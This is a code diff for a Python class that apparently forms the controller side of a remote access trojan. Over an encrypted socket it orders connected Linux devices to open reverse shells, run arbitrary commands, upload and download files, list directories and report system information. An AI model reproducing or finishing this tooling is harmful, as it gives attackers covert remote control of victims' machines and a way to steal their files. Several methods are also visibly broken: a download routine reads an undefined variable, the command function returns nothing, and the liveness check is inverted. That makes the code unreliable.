@@ -3,11 +3,19 @@ from globals import *
 
 class Linux():
     """The Linux Device Class to interact with the Device"""
+
+    def save_infos(self):
+        """Save Infos to the Device Database"""
+        conn = connect("Data/db.sqlite3")
+        curr = conn.cursor()
     def __str__(self) -> str:
         return str(self.addr[0])
-    def __init__(self, connection):
-        self.self.conn = connection[0]
-        self.addr = connection[1]
+
+    def __init__(self, conn, addr, key):
+        self.conn = conn
+        self.addr = addr
+        self.key = key
+        self.fernet = Fernet(key)
 
     def decrypt(self, data):
         # Decrypt the data
@@ -38,44 +46,36 @@ class Linux():
             str: Message
         """
         self.conn.send(self.encrypt(f"SHELL:{address}:{port}"))
-        try:
-            output = self.decrypt(self.conn.recv(1024))
-        except:
-            return False, ""
+        output = self.decrypt(self.conn.recv(1024))
+        if output.startswith("!"):
+            raise Exception("Couldn't open a Reverse Shell")
         else:
-            if output == "0":
-                return False, "Couldn't open a Reverse Shell"
-            else:
-                return True, output
+            return output
 
     def file_upload(self, fil, path):
         """Upload a File to a Device
         Args:
-            fil (string): File to Upload	
+            fil (string): File to Upload
             path (string): Path to Upload the File to
 
         Returns:
             bool: True if success, False if not
             str: Error or Success Message
         """
-        try:
-            f = open(fil, "rb")
-            fil = fil.split("/")
-            self.conn.send(self.encrypt(f"file-u:{fil[-1]}|{path}"))
-            time.sleep(1)
-            self.conn.sendfile(f)
-            status = self.decrypt(self.conn.recv(1024))
-            if status == "0":
-                raise Exception("File Upload Failed")
-        except:
-            return False, "File could not be uploaded"
+        f = open(fil, "rb")
+        fil = fil.split("/")
+        self.conn.send(self.encrypt(f"file-u:{fil[-1]}|{path}"))
+        time.sleep(1)
+        self.conn.sendfile(f)
+        output = self.decrypt(self.conn.recv(1024))
+        if output.startswith("!"):
+            raise Exception("File Upload Failed")
         else:
-            return True, "File uploaded"
-
+            return output
     def file_download(self, device_path, own_path):
         """Upload a File to a Device
         Args:
-            fil (string): File to Upload	
+            fil (string): File to Upload
             device_path (string): Path to Download the File from
             own_path (string): Path to Download the File to
 
@@ -83,19 +83,16 @@ class Linux():
             bool: True if success, False if not
             str: Error or Success Message
         """
-        try:
-            f = open(fil, "rb")
-            fil = fil.split("/")
-            self.conn.send(self.encrypt(f"file-d:{device_path}"))
-            fil = self.conn.recv(1024)
-            if fil == "0":
-                raise Exception
+        f = open(fil, "rb")
+        fil = fil.split("/")
+        self.conn.send(self.encrypt(f"file-d:{device_path}"))
+        fil = self.conn.recv(1024)
+        if fil.startswith("!"):
+            raise Exception("Couldn't download the File")
+        else:
             with open(own_path, "wb") as f:
                 f.write(fil)
-        except:
-            return False, "File not found"
-        else:
-            return True, "File downloaded"
+            return "File Downloaded to " + own_path
 
     def rce(self, cmd):
         """Send a Cmd to a Device and return the Output
@@ -107,14 +104,9 @@ class Linux():
             str: Output of the command
         """
         self.conn.send(self.encrypt(f"CMD:{cmd}"))
-        try:
-            output = self.decrypt(self.conn.recv(1024))
-        except:
-            return False, ""
-        else:
-            return True, output
+        output = self.decrypt(self.conn.recv(1024))
 
-    def get_device_infos(self, id):
+    def get_device_infos(self):
         """Get Infos about a Device
         Args:
         Returns:
@@ -122,14 +114,10 @@ class Linux():
             str: Infos about the Device
         """
         self.conn.send(self.encrypt(f"INFOS:"))
-        try:
-            output = self.decrypt(self.conn.recv(1024))
-            output = json.loads(output)
-        except Exception as e:
-            print(e)
-            return False, ""
-        else:
-            return True, output
+        output = self.decrypt(self.conn.recv(1024))
+        print(output)
+        output = json.loads(output)
+        return output
 
     def get_directory_contents(self, dir):
         """Get the contents of a directory
@@ -140,18 +128,20 @@ class Linux():
             str: Files in the directory or an Error Message
         """
         self.conn.send(self.encrypt(f"dir:{dir}"))
-        try:
-            output = self.decrypt(self.conn.recv(1024))
-        except:
-            return False, ""
+        output = self.decrypt(self.conn.recv(1024))
+        if output.startswith("!"):
+            raise Exception("Couldn't get the Directory")
         else:
-            return True, output
+            return output
 
     def get_file_contents(self, path):
         self.conn.send(self.encrypt(f"content:{path}"))
-        try:
-            output = self.decrypt(self.conn.recv(1024))
-        except:
-            return False, ""
+        output = self.decrypt(self.conn.recv(1024))
+        if output.startswith("!"):
+            raise Exception("Couldn't get the File")
         else:
-            return True, output
+            return output
+    def alive(self):
+        self.conn.send(self.encrypt("alive:alive"))
+        if self.conn.recv(1024).decode() == "alive":
+            raise Exception("Device is not alive")
